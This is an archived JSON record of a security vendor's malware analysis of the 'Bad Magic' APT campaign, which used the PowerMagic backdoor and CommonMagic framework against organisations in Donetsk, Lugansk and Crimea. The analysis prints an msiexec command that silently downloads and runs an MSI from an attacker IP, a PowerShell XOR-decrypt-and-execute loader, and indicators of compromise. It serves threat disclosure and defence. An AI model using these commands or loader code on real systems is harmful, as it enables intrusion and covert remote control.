{
    "id": "c6c41d60-8823-4678-b450-caa4e71be032",
    "created_at": "2023-04-05T02:09:08.846873Z",
    "updated_at": "2025-03-27T02:10:20.417021Z",
    "deleted_at": null,
    "sha1_hash": "8e38277d6ed384e9249fa5618bf44fb410edaa3a",
    "title": "2023-03-21 - Bad magic- new APT found in the area of Russo-Ukrainian conflict",
    "authors": "",
    "file_creation_date": "2023-04-03T08:47:49Z",
    "file_modification_date": "2023-04-03T08:47:49Z",
    "file_size": 1256376,
    "plain_text": "# Bad magic: new APT found in the area of Russo-Ukrainian conflict\n\n**securelist.com/bad-magic-apt/109087/**\n\nAuthors\n\n[Leonid Bezvershenko](https://securelist.com/author/leonidbezvershenko/)\n\n[Georgy Kucherin](https://securelist.com/author/georgykucherin/)\n\n[Igor Kuznetsov](https://securelist.com/author/igorsoumenkov/)\n\n## Administrative organizations were attacked with PowerMagic backdoor and CommonMagic framework\n\n[Since the start of the Russo-Ukrainian conflict, Kaspersky researchers and the international](https://securelist.com/elections-goransom-and-hermeticwiper-attack/105960/)\ncommunity at large have identified a significant number of cyberattacks executed in a political and\ngeopolitical context. We previously published an overview of cyber activities and the threat\nlandscape related to the conflict between Russia and Ukraine and continue to monitor new threats\nin these regions.\n\nIn October 2022, we identified an active infection of government, agriculture and transportation\norganizations located in the Donetsk, Lugansk, and Crimea regions. Although the initial vector of\ncompromise is unclear, the details of the next stage imply the use of spear phishing or similar\n\n\n-----\n\nmethods. The victims navigated to a URL pointing to a ZIP archive hosted on a malicious web\nserver. The archive, in turn, contained two files:\n\nA decoy document (we discovered PDF, XLSX and DOCX versions)\nA malicious LNK file with a double extension (e.g., .pdf.lnk) that leads to infection when\nopened\n\n**_Malicious ZIP archive_**\n\n\n-----\n\n**_Decoy Word document (subject: Results of the State Duma elections in the Republic of_**\n**_Crimea)_**\n\nIn several cases, the contents of the decoy document were directly related to the name of the\nmalicious LNK to trick the user into activating it. For example, one archive contained an LNK file\n[named “Приказ Минфина ДНР № 176.pdf.lnk” (Ministry of Finance Decree No. 176), and the](https://minfindnr.ru/wp-content/uploads/2022/09/pr_176_ot_15-09-2022.pdf)\ndecoy document explicitly referenced it by name in the text.\n\n\n-----\n\n**_Decoy PDF with reference to a malicious shortcut file (subject: information about DPR_**\n**_Ministry of Finance Decree No. 176)_**\n\nThe ZIP files were downloaded from various locations hosted on two domains: webservicesrv[.]online and webservice-srv1[.]online\n\nKnown attachment names, redacted to remove personal information:\n\n**MD5 (name)** **First**\n**detection**\n\n0a95a985e6be0918fdb4bfabf0847b5a (новое отмена решений уик 288.zip) 2021-09-22\n13:47\n\n\necb7af5771f4fe36a3065dc4d5516d84\n(внесение_изменений_в_отдельные_законодательные_акты_рф.zip)\n\n\n2022-04-28\n07:36\n\n\n765f45198cb8039079a28289eab761c5 (гражданин рб (redacted) .zip) 2022-06-06\n11:40\n\n\n-----\n\nebaf3c6818bfc619ca2876abd6979f6d (цик 3638.zip) 2022-08-05\n08:39\n\n1032986517836a8b1f87db954722a33f (сз 14-1519 от 10.08.22.zip) 2022-08-12\n10:21\n\n1de44e8da621cdeb62825d367693c75e (приказ минфина днр № 176.zip) 2022-09-23\n08:10\n\nWhen the potential victim activates the LNK file included in the ZIP file, it triggers a chain of\nevents that lead to the infection of the computer with a previously unseen malicious framework\nthat we named CommonMagic. The malware and techniques used in this campaign are not\nparticularly sophisticated, but are effective, and the code has no direct relation to any known\ncampaigns.\n\n**_Infection chain_**\n\n## Infection chain\n\n\n-----\n\n**_Installation workflow_**\n\nThe malicious LNK points to a remotely hosted malicious MSI file that is downloaded and started\nby the Windows Installer executable.\n\n\n1\n\n2\n\n3\n\n\n%WINDIR%\\System32\\msiexec.exe /i\n\nhttp://185.166.217[.]184/CFVJKXIUPHESRHUSE4FHUREHUIFERAY97A4FXA/attachment.msi\n/quiet\n\n\nThe MSI file is effectively a dropper package, containing an encrypted next-stage payload\n(service_pack.dat), a dropper script (runservice_pack.vbs) and a decoy document that is\nsupposed to be displayed to the victim.\n\n**_Files contained in attachment.msi_**\n\nThe encrypted payload and the decoy document are written to the folder named\n**%APPDATA%\\WinEventCom. The VBS dropper script is, in turn, a wrapper for launching an**\nembedded PowerShell script that decrypts the next stage using a simple one-byte XOR, launches\n\n\n-----\n\nit and deletes it from disk.\n\n**Decryption of service_pack.dat**\n\nPowerShell\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\n$inst=\"$env:APPDATA\\WinEventCom\\service_pack.dat\";\n\nif (!(Test-Path $inst)){\n\nreturn;\n\n}\n\n$binst=[System.IO.File]::ReadAllBytes($inst);\n\n$xbinst=New-Object Byte[] $binst.Count;\n\nfor ($i=0;$i-lt$binst.Count;$i++) {\n\n$xbinst[$i]=$binst[$i]-bxor0x13;\n\n$xbinst[$i]=$binst[$i]-bxor0x55;\n\n$xbinst[$i]=$binst[$i]-bxor0xFF;\n\n$xbinst[$i]=$binst[$i]-bxor0xFF;\n\n};\n\nTry {\n\n[System.Text.Encoding]::ASCII.GetString($xbinst)|iex;\n\n}\n\nCatch {};\n\nStart-Sleep 3;\n\nRemove-Item -Path $inst -Force\n\n\nThe next-stage script finalizes the installation: it opens the decoy document to display it to the\nuser, writes two files named config and manutil.vbs to %APPDATA%\\WinEventCom, and\ncreates a Task Scheduler job named WindowsActiveXTaskTrigger, to execute\nthe wscript.exe%APPDATA%\\WinEventCom\\manutil.vbs command every day.\n\n## The PowerMagic backdoor\n\nThe script manutil.vbs, which is dropped by the initial package, is a loader for a previously\nunknown backdoor written in PowerShell that we named PowerMagic. The main body of the\nbackdoor is read from the file %APPDATA%\\WinEventCom\\config and decrypted with a simple\n\n\n-----\n\nXOR (key: 0x10).\n\n**Snippet of PowerMagic’s code containing the “powermagic” string**\n\nPowerShell\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n\n$AppDir='powermagic';\n\n$ClinetDir='client';\n\n$ClinetTaskDir='task';\n\n$ClinetResultDir='result';\n\n$ClientToken=redacted\n\n$dbx_up='https://content.dropboxapi.com/2/files/upload';\n\n$dbx_down = 'https://content.dropboxapi.com/2/files/download';\n\n\nWhen started, the backdoor creates a mutex – WinEventCom. Then, it enters an infinite loop\ncommunicating with its C&C server, receiving commands and uploading results in response. It\nuses OneDrive and Dropbox folders as transport, and OAuth refresh tokens as credentials.\n\nEvery minute the backdoor performs the following actions:\n\n1. Modifies the heartbeat file located at /$AppDir/$ClientDir/<machine UID> (the values of the\n\n$AppDir and $ClientDir PowerShell variables may differ between samples). The contents of\nthis file consist of the backdoor PID and a number incremented by one with each file\nmodification.\n2. Downloads commands that are stored as a file in the /$AppDir/$ClientTaskDir directory.\n3. Executes every command as a PowerShell script.\n4. Uploads the output of the executed PowerShell command to the cloud storage, placing it in\n\nthe /$AppDir/$ClientResultDir/<victim machine UUID>.<timestamp> file.\n\n## The CommonMagic framework\n\nAs it turned out, PowerMagic was not the only malicious toolkit used by the actor. All the victims of\nPowerMagic were also infected with a more complicated, previously unseen, modular malicious\nframework that we named CommonMagic. This framework was deployed after initial infection with\nthe PowerShell backdoor, leading us to believe that CommonMagic is deployed via PowerMagic.\n\nThe CommonMagic framework consists of several executable modules, all stored in the directory\n**C:\\ProgramData\\CommonCommand. Modules start as standalone executable files and**\ncommunicate via named pipes. There are dedicated modules for interaction with the C&C server,\nencryption and decryption of the C&C traffic and various malicious actions.\n\nThe diagram below illustrates the architecture of the framework.\n\n\n-----\n\n**_Framework architecture_**\n\n### Network communication\n\n[The framework uses OneDrive remote folders as a transport. It utilizes the Microsoft Graph API](https://learn.microsoft.com/en-us/graph/use-the-api)\nusing an OAuth refresh token embedded into the module binary for authentication. The\n[RapidJSON library is used for parsing JSON objects returned by the Graph API.](https://rapidjson.org/)\n\nA dedicated heartbeat thread updates the remote file <victim ID>/S/S.txt every five minutes with\nthe local timestamp of the victim.\n\nThen, in separate threads, the network communication module downloads new executable\nmodules from the directory <victim ID>/M and uploads the results of their execution to the\ndirectory <victim ID>/R.\n\nThe data exchanged with the operator via the OneDrive location is encrypted using the\nRC5Simple open-source library. By default, this library uses the seven-byte sequence “RC5SIMP”\nat the beginning of the encrypted sequence, but the developers of the backdoor changed it to\n“Hwo7X8p”. Encryption is implemented in a separate process, communicating over the pipes\nnamed \\\\.\\pipe\\PipeMd and \\\\.\\pipe\\PipeCrDtMd.\n\n### Plugins\n\nSo far, we have discovered two plugins implementing the malicious business logic. They are\nlocated in the directory C:\\ProgramData\\CommonCommand\\Other.\n\n**Screenshot (S.exe) – takes screenshots every three seconds using the GDI API**\n\n\n-----\n\n**USB (U.exe) – collects the contents of the files with the following extensions from connected**\nUSB devices: .doc, .docx. .xls, .xlsx, .rtf, .odt, .ods, .zip, .rar, .txt, .pdf.\n\n## To be continued\n\nSo far, we have found no direct links between the samples and data used in this campaign and\nany previously known actors. However, the campaign is still active, and our investigation\ncontinues. So, we believe that further discoveries may reveal additional information about this\nmalware and the threat actor behind it.\n\n## CommonMagic indicators of compromise\n\n**Lure archives**\n\n[0a95a985e6be0918fdb4bfabf0847b5a новое отмена решений уик 288.zip (new cancellation of](https://opentip.kaspersky.com/0a95a985e6be0918fdb4bfabf0847b5a/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nresolution local election committee 288.zip)\n\n[ecb7af5771f4fe36a3065dc4d5516d84](https://opentip.kaspersky.com/ecb7af5771f4fe36a3065dc4d5516d84/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nвнесение_изменений_в_отдельные_законодательные_акты_рф.zip (making changes to\nseveral russian federation laws.zip)\n\n[765f45198cb8039079a28289eab761c5 гражданин рб (redacted) .zip (citizen of republic of](https://opentip.kaspersky.com/765f45198cb8039079a28289eab761c5/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\nbelarus (redacted).zip)\n\n[ebaf3c6818bfc619ca2876abd6979f6d цик 3638.zip (central election committee 3638.zip)](https://opentip.kaspersky.com/ebaf3c6818bfc619ca2876abd6979f6d/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n[1032986517836a8b1f87db954722a33f сз 14-1519 от 10.08.22.zip (memo 14-1519 dated](https://opentip.kaspersky.com/1032986517836a8b1f87db954722a33f/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n10.08.22.zip)\n\n[1de44e8da621cdeb62825d367693c75e приказ минфина днр № 176.zip (dpr ministry of finance](https://opentip.kaspersky.com/1de44e8da621cdeb62825d367693c75e/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\norder #176.zip)\n\n**PowerMagic installer**\n\n[fee3db5db8817e82b1af4cedafd2f346 attachment.msi](https://opentip.kaspersky.com/fee3db5db8817e82b1af4cedafd2f346/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**PowerMagic dropper**\n\n[bec44b3194c78f6e858b1768c071c5db service_pack.dat](https://opentip.kaspersky.com/bec44b3194c78f6e858b1768c071c5db/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**PowerMagic loader**\n\n[8c2f5e7432f1e6ad22002991772d589b manutil.vbs](https://opentip.kaspersky.com/8c2f5e7432f1e6ad22002991772d589b/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**PowerMagic backdoor**\n\n[1fe3a2502e330432f3cf37ca7acbffac](https://opentip.kaspersky.com/1fe3a2502e330432f3cf37ca7acbffac/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**CommonMagic loader**\n\n[ce8d77af445e3a7c7e56a6ea53af8c0d All.exe](https://opentip.kaspersky.com/ce8d77af445e3a7c7e56a6ea53af8c0d/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**CommonMagic cryptography module**\n\n[9e19fe5c3cf3e81f347dd78cf3c2e0c2 Clean.exe](https://opentip.kaspersky.com/9e19fe5c3cf3e81f347dd78cf3c2e0c2/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n**CommonMagic network communication module**\n\n[7c0e5627fd25c40374bc22035d3fadd8 Overall.exe](https://opentip.kaspersky.com/7c0e5627fd25c40374bc22035d3fadd8/?utm_source=SL&utm_medium=SL&utm_campaign=SL)\n\n\n-----\n\n**Distribution servers**\nwebservice-srv[.]online\n\nwebservice-srv1[.]online\n\n185.166.217[.]184\n\n[APT](https://securelist.com/tag/apt/)\n[Backdoor](https://securelist.com/tag/backdoor/)\n[Cloud services](https://securelist.com/tag/cloud-services/)\n[CommonMagic](https://securelist.com/tag/commonmagic/)\n[Malware Descriptions](https://securelist.com/tag/malware-descriptions/)\n[PowerMagic](https://securelist.com/tag/powermagic/)\n[PowerShell](https://securelist.com/tag/powershell/)\n[Spear phishing](https://securelist.com/tag/spear-phishing/)\n[Targeted attacks](https://securelist.com/tag/targeted-attacks/)\n\nAuthors\n\n[Leonid Bezvershenko](https://securelist.com/author/leonidbezvershenko/)\n\n[Georgy Kucherin](https://securelist.com/author/georgykucherin/)\n\n[Igor Kuznetsov](https://securelist.com/author/igorsoumenkov/)\n\nBad magic: new APT found in the area of Russo-Ukrainian conflict\n\nYour email address will not be published. Required fields are marked *\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-21 - Bad magic- new APT found in the area of Russo-Ukrainian conflict.pdf"
    ],
    "report_names": [
        "2023-03-21 - Bad magic- new APT found in the area of Russo-Ukrainian conflict.pdf"
    ],
    "threat_actors": [
        {
            "id": "3f918a1b-2f20-4f3f-ae16-31e83d9d91d9",
            "created_at": "2023-06-23T02:04:34.088425Z",
            "updated_at": "2025-03-27T02:02:09.769759Z",
            "deleted_at": null,
            "main_name": "Bad Magic",
            "aliases": [
                "Bad Magic",
                "CloudWizard",
                "RedStinger"
            ],
            "source_name": "ETDA:Bad Magic",
            "tools": [
                "CommonMagic",
                "PowerMagic"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "ff5a7bd9-75a5-43fe-ba4c-27dab43e1f61",
            "created_at": "2023-11-07T02:00:07.086058Z",
            "updated_at": "2025-03-27T02:00:03.169516Z",
            "deleted_at": null,
            "main_name": "RedStinger",
            "aliases": [
                "Bad Magic"
            ],
            "source_name": "MISPGALAXY:RedStinger",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1680660548,
    "ts_updated_at": 1743041420,
    "ts_creation_date": 1680511669,
    "ts_modification_date": 1680511669,
    "files": {
        "pdf": "https://archive.orkl.eu/8e38277d6ed384e9249fa5618bf44fb410edaa3a.pdf",
        "text": "https://archive.orkl.eu/8e38277d6ed384e9249fa5618bf44fb410edaa3a.txt",
        "img": "https://archive.orkl.eu/8e38277d6ed384e9249fa5618bf44fb410edaa3a.jpg"
    }
}